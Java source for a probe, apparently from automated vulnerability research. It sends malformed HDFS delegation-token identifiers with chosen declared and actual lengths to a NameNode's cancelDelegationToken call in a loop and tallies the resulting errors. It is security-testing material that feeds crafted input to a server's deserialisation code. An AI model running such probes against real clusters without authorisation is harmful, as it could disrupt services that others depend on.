/*
 * Stage-4 cluster-tier probe (B3a) for DEFAULT_MAX_LEN-readFields-maxLength--autonomous.
 * Usage: java -cp "$(hadoop classpath):<dir>" NnTokenProbe <L> <A> <count>
 * Builds identifier bytes [0][vint L][A bytes 'a'], wraps them in an HDFS delegation token and calls
 * ClientProtocol.cancelDelegationToken <count> times; prints a tally of the first line of each error.
 */
import java.util.Arrays;
import java.util.Map;
import java.util.TreeMap;

import org.apache.hadoop.conf.Configuration;
import org.apache.hadoop.fs.FileSystem;
import org.apache.hadoop.hdfs.DistributedFileSystem;
import org.apache.hadoop.hdfs.protocol.ClientProtocol;
import org.apache.hadoop.hdfs.security.token.delegation.DelegationTokenIdentifier;
import org.apache.hadoop.io.DataOutputBuffer;
import org.apache.hadoop.io.Text;
import org.apache.hadoop.io.WritableUtils;
import org.apache.hadoop.ipc.RemoteException;
import org.apache.hadoop.security.token.Token;

public class NnTokenProbe {
  public static void main(String[] args) throws Exception {
    int L = Integer.parseInt(args[0]);
    int A = Integer.parseInt(args[1]);
    int count = Integer.parseInt(args[2]);

    DataOutputBuffer out = new DataOutputBuffer();
    out.writeByte(0); // AbstractDelegationTokenIdentifier.VERSION
    WritableUtils.writeVInt(out, L);
    byte[] pay = new byte[A];
    Arrays.fill(pay, (byte) 'a');
    out.write(pay);
    byte[] id = Arrays.copyOf(out.getData(), out.getLength());

    Token<DelegationTokenIdentifier> token = new Token<>(id, new byte[0],
        DelegationTokenIdentifier.HDFS_DELEGATION_KIND, new Text("probe"));

    Configuration conf = new Configuration();
    DistributedFileSystem fs = (DistributedFileSystem) FileSystem.get(conf);
    ClientProtocol nn = fs.getClient().getNamenode();
    System.out.println("PROBE-START L=" + L + " A=" + A + " count=" + count
        + " identifierBytes=" + id.length + " fs=" + fs.getUri());

    Map<String, Integer> tally = new TreeMap<>();
    long t0 = System.nanoTime();
    for (int i = 0; i < count; i++) {
      String key;
      try {
        nn.cancelDelegationToken(token);
        key = "OK (no exception)";
      } catch (RemoteException re) {
        String m = String.valueOf(re.getMessage());
        int nl = m.indexOf('\n');
        key = re.getClassName() + ": " + (nl >= 0 ? m.substring(0, nl) : m);
      } catch (Throwable t) {
        String m = String.valueOf(t.getMessage());
        int nl = m.indexOf('\n');
        key = "LOCAL " + t.getClass().getName() + ": " + (nl >= 0 ? m.substring(0, nl) : m);
      }
      tally.merge(key, 1, Integer::sum);
    }
    long ms = (System.nanoTime() - t0) / 1_000_000;
    for (Map.Entry<String, Integer> e : tally.entrySet()) {
      System.out.println("TALLY L=" + L + " count=" + e.getValue() + " msg=" + e.getKey());
    }
    System.out.println("PROBE-END L=" + L + " elapsedMs=" + ms);
    fs.close();
  }
}
